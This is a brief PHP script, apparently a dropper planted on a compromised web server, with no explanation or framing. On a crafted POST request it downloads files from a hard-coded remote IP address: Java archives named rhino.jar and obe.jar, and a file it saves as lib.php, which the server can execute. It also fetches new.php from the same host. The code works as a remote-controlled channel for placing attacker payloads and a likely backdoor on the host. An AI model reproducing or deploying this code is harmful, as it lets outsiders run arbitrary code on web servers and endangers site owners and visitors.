<?php

if(isset($_POST['exp']))
{
$sell = $_POST['exp'];
$e = explode(":", $sell);
 $rhino = false;
 $obe = false;
 $lib = false;
 
for ($i = 0; $i < count($e); $i++)
	{
		if($e[$i] == 'rhino')$rhino = true;
		if($e[$i] == 'obe') $obe = true;
		if($e[$i] == 'lib') $lib = true;	
	}
	
	
	if($rhino)	
	{
		  $url = file_get_contents("http://176.31.116.167/ad/rhino.jar");
          file_put_contents("rhin.jar",$url);
	}
	if($obe)	
	{
		  $url = file_get_contents("http://176.31.116.167/ad/obe.jar");
          file_put_contents("Goo.jar",$url);
	}
	if($lib)	
	{
		  $url = file_get_contents("http://176.31.116.167/ad/lib.file");
          file_put_contents("lib.php",$url);
	}
	 $url = file_get_contents("http://176.31.116.167/ad/new.php");
}
//==================================
